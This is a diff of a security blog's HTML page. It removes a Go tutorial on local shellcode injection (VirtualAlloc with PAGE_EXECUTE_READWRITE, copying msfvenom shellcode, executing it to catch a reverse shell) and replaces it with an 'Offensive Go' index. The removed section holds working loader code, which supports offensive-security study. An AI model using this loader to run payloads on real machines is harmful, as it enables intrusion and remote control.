@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>Code Injection - Jan0ski's Security Blog</title>
+        <title>Offensive Go - Jan0ski's Security Blog</title>
         
         
 
@@ -95,7 +95,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../prefix.html">Index</a></li><li class="chapter-item expanded affix "><li class="part-title">Code</li><li class="chapter-item expanded "><a href="../golang/index.html"><strong aria-hidden="true">1.</strong> Offensive Go</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../golang/rev-shell.html"><strong aria-hidden="true">1.1.</strong> Reverse Shell</a></li><li class="chapter-item expanded "><a href="../golang/code-injection.html" class="active"><strong aria-hidden="true">1.2.</strong> Code Injection</a></li><li class="chapter-item expanded "><a href="../golang/encrypted-generator.html"><strong aria-hidden="true">1.3.</strong> Encrypted Paylod Generator</a></li><li class="chapter-item expanded "><a href="../golang/exif-fuzz.html"><strong aria-hidden="true">1.4.</strong> Exif Parser Fuzzing</a></li></ol></li><li class="chapter-item expanded "><li class="part-title">Cloud Security</li><li class="chapter-item expanded "><a href="../k8s/index.html"><strong aria-hidden="true">2.</strong> Containers &amp; Kubernetes</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../k8s/hostpath.html"><strong aria-hidden="true">2.1.</strong> HostPath</a></li><li class="chapter-item expanded "><a href="../k8s/kubesec-sdk.html"><strong aria-hidden="true">2.2.</strong> Kube_Security_Lab w/ Client-go</a></li></ol></li><li class="chapter-item expanded "><li class="part-title">Challenges</li><li class="chapter-item expanded "><a href="../ctf/index.html"><strong aria-hidden="true">3.</strong> CTF Write-ups</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../prefix.html">Index</a></li><li class="chapter-item expanded affix "><li class="part-title">Code</li><li class="chapter-item expanded "><a href="../golang/index.html" class="active"><strong aria-hidden="true">1.</strong> Offensive Go</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../golang/rev-shell.html"><strong aria-hidden="true">1.1.</strong> Reverse Shell</a></li><li class="chapter-item expanded "><a href="../golang/code-injection.html"><strong aria-hidden="true">1.2.</strong> Code Injection</a></li><li class="chapter-item expanded "><a href="../golang/encrypted-generator.html"><strong aria-hidden="true">1.3.</strong> Encrypted Paylod Generator</a></li><li class="chapter-item expanded "><a href="../golang/exif-fuzz.html"><strong aria-hidden="true">1.4.</strong> Exif Parser Fuzzing</a></li></ol></li><li class="chapter-item expanded "><li class="part-title">Cloud Security</li><li class="chapter-item expanded "><a href="../k8s/index.html"><strong aria-hidden="true">2.</strong> Containers &amp; Kubernetes</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../k8s/hostpath.html"><strong aria-hidden="true">2.1.</strong> HostPath</a></li><li class="chapter-item expanded "><a href="../k8s/kubesec-sdk.html"><strong aria-hidden="true">2.2.</strong> Kube_Security_Lab w/ Client-go</a></li></ol></li><li class="chapter-item expanded "><li class="part-title">Challenges</li><li class="chapter-item expanded "><a href="../ctf/index.html"><strong aria-hidden="true">3.</strong> CTF Write-ups</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -167,64 +167,19 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1><a class="header" href="#code-injection" id="code-injection">Code Injection</a></h1>
-<p>Example of injecting shellcode into a local process.</p>
-<hr />
-<h2><a class="header" href="#calling-the-windows-api" id="calling-the-windows-api">Calling the Windows API</a></h2>
-<p>To call the Windows API in Go, we need to use the <code>syscall</code> library to load <code>kernel32.dll</code> and create references to the functions we need to use. Additionally, we'll create some constants reflecting those that exist in the Windows API.</p>
-<p>For shellcode injection, the <code>VirtualAlloc</code> Windows function is used to allocate memory in our process to store the payload.</p>
-<pre><code class="language-go">const (
-	PROCESS_ALL_ACCESS     = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
-	MEM_COMMIT             = 0x001000
-	MEM_RESERVE            = 0x002000
-	PAGE_EXECUTE_READWRITE = 0x40
-)
-
-var (
-	kernel32         = syscall.NewLazyDLL(&quot;kernel32.dll&quot;)
-	procVirtualAlloc = kernel32.NewProc(&quot;VirtualAlloc&quot;)
-)
-</code></pre>
-<hr />
-<h2><a class="header" href="#allocating-memory-and-calling-virtualalloc" id="allocating-memory-and-calling-virtualalloc">Allocating memory and calling VirtualAlloc</a></h2>
-<p>Referencing documentation for the <code>VirtualAlloc</code> function in the C++ Windows API, we set our parameters to the <code>Call</code> function similarly in Go:</p>
-<p>C++</p>
-<pre><code class="language-c++">LPVOID VirtualAlloc(
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD  flAllocationType,
-    DWORD  flProtect
-);
-</code></pre>
-<p>Go</p>
-<pre><code class="language-go">	// Allocate memory as PAGE_EXECUTE_READWRITE
-	addr, _, err := procVirtualAlloc.Call(
-		0,                       // Starting address of region to allocate
-		uintptr(len(shellcode)), // Size of region to allocate
-		MEM_RESERVE|MEM_COMMIT,  // Memory allocation type
-		PAGE_EXECUTE_READWRITE,  // Memory protection permissions
-	)
-</code></pre>
-<p>Next, we write our shellcode into the allocated memory and execute it via a <code>syscall</code> at that memory address.</p>
-<p>To copy the shellcode, we create a pointer reference to our allocated memory, <code>addr</code>, and cast it as a pointer to a large byte array.
-After the payload is copied in, we can execute it with <code>syscall.Syscall()</code>, passing in our shellcode starting address:</p>
-<pre><code class="language-go">	// Write the shellcode into the allocated memory
-	buf := (*[890000]byte)(unsafe.Pointer(addr))
-	for x, value := range []byte(shellcode) {
-		buf[x] = value
-	}
-
-	syscall.Syscall(addr, 0, 0, 0, 0)
-</code></pre>
-<p>Since the msfvenom shellcode is 32-bit, we set the GOARCH environment variable accordingly to compile into a 32-bit executable. If all goes well, building and executing the source should show our shellcode is executed:</p>
-<p><img src="../images/reverse_shell.png" alt="Reverse Shell" /></p>
-<p align=center>Catching the reverse shell launched via injected shellcode payload.</p>
-<hr />
-<h2><a class="header" href="#references" id="references">References</a></h2>
+                        <h1><a class="header" href="#offensive-go" id="offensive-go">Offensive Go</a></h1>
+<h2><a class="header" href="#reverse-shell" id="reverse-shell">Reverse Shell</a></h2>
 <ul>
-<li><a href="https://ired.team/offensive-security/code-injection-process-injection/process-injection">CreateRemoteThread Shellcode Injection</a></li>
-<li><a href="https://medium.com/jettech/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724">Using Go to Call the Windows API</a></li>
-<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN">VirtualAlloc function - Win32 apps</a></li>
+<li><a href="./rev-shell.html">Reverse Shell</a></li>
+</ul>
+<h2><a class="header" href="#code-injection" id="code-injection">Code Injection</a></h2>
+<ul>
+<li><a href="./code-injection.html">Local Shellcode Injection</a></li>
+<li><a href="./encrypted-generator.html">Encrypted Paylod Generator</a></li>
+</ul>
+<h2><a class="header" href="#exif-parser-fuzzing" id="exif-parser-fuzzing">Exif Parser Fuzzing</a></h2>
+<ul>
+<li><a href="./exif-fuzz.html">Exif Parser Fuzzing</a></li>
 </ul>
 
                     </main>
@@ -232,13 +187,13 @@ After the payload is copied in, we can execute it with <code>syscall.Syscall()</
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
                         
-                            <a rel="prev" href="../golang/rev-shell.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                            <a rel="prev" href="../prefix.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
                             </a>
                         
 
                         
-                            <a rel="next" href="../golang/encrypted-generator.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                            <a rel="next" href="../golang/rev-shell.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
                         
@@ -250,13 +205,13 @@ After the payload is copied in, we can execute it with <code>syscall.Syscall()</
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
                 
-                    <a rel="prev" href="../golang/rev-shell.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                    <a rel="prev" href="../prefix.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
                 
 
                 
-                    <a rel="next" href="../golang/encrypted-generator.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                    <a rel="next" href="../golang/rev-shell.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
                 
